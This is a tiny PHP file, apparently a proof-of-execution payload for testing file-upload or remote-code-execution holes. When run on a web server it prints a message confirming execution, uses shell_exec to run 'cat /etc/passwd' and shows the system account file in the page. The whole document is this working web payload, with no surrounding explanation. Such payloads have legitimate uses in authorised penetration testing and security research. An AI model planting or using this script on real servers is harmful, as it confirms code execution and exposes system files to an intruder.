<?php
  echo "If you see this means, this file has been executed";
  $output = shell_exec('cat /etc/passwd');
  echo "<pre>$output</pre>";
?>